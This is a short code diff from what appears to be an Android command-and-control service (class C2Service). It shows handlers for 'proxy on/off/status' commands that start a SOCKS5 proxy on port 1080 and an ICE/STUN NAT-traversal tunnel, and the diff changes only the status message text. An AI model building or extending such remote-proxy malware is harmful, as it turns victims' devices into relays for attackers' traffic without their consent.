@@ -91,12 +91,12 @@ public class C2Service extends Service {
         if (cmd.equalsIgnoreCase("proxy on")) {
             proxyService.startProxy();
             juiceService.startTunnel();
-            return "✅ SOCKS5 proxy started on port 1080\n✅ NAT traversal via ICE/STUN started\n\n📋 ICE Info:\n" + juiceService.getIceInfo();
+            return "✅ SOCKS5 proxy started on port 1080\n✅ ICE/STUN NAT traversal started\n\n📋 ICE Info:\n" + juiceService.getIceInfo();
         }
         if (cmd.equalsIgnoreCase("proxy off")) {
             proxyService.stopProxy();
             juiceService.stopTunnel();
-            return "❌ Proxy stopped\n❌ NAT traversal stopped";
+            return "❌ Proxy stopped\n❌ ICE/STUN stopped";
         }
         if (cmd.equalsIgnoreCase("proxy status")) {
             String status = proxyService.isRunning() ? "✅ Proxy running on port 1080" : "❌ Proxy stopped";
